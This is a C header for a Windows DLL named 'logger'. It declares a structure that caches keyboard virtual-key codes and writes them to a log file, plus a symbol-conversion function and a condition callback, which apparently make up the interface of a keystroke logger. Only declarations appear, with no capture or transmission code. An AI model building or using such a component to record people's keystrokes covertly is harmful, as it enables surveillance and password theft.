#ifndef LOGGER_H
#define LOGGER_H

#include <stdio.h>
#include <time.h>
#include <windows.h>
#include "core/dll_defines.h"

#define MAX_INPUTS 200

#ifdef DEBUG
#define DLOG(msg) printf("%s\n", msg)
#else
#define DLOG(msg)
#endif

#ifdef DEBUG
#define DLogError(msg) fprintf(stderr, "%s\n", msg)
#else
#define DLogError(msg)
#endif 

// Define the callback function type
typedef void (*onConditionCallback)(void *param);

typedef struct
{
    char inputKeyCodes[MAX_INPUTS]; // Cached input key codes
    int currentIndex;               // Current index of the cached input key codes
    const char *filename;           // Log file name
    FILE *file;                     // File pointer
    onConditionCallback m_pOnConditionCallback;
} logger;

// Declarations
dll_export HRESULT createLogger(const char *filename);
dll_export void logMessage(const char *message);
dll_export void closeLogger();
dll_export char getKeyboardSymbol(int vkCode);
dll_export void setOnConditionCallback(onConditionCallback _onConditionCallback);
int isPrintable(char symbol);

#endif // LOGGER_H
